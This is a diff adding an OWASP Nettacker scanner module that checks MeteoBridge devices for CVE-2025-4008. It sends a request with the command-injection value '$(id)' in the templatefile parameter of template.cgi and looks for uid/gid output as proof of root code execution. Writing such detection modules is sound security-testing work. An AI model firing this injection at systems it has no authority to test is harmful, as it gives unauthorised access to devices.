@@ -1,0 +1,53 @@
+info:
+  name: meteobridge_cve_2025_4008_vuln
+  author: OWASP Nettacker Team
+  severity: 8.7
+  description: |
+    MeteoBridge <= 6.1 is vulnerable to unauthenticated command injection via
+    the templatefile parameter in template.cgi, allowing remote code execution
+    with root privileges.
+  reference:
+    - https://forum.meteohub.de/viewtopic.php?t=18687
+    - https://www.onekey.com/resource/security-advisory-remote-command-execution-on-smartbedded-meteobridge-cve-2025-4008
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-4008
+  profiles:
+    - vuln
+    - http
+    - high_severity
+    - cve
+    - cve2025
+    - meteobridge
+    - rce
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 5
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/public/template.cgi?templatefile=$(id)"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "(?s)(Error: template file).*?(uid=).*?(gid=)"
+              reverse: false
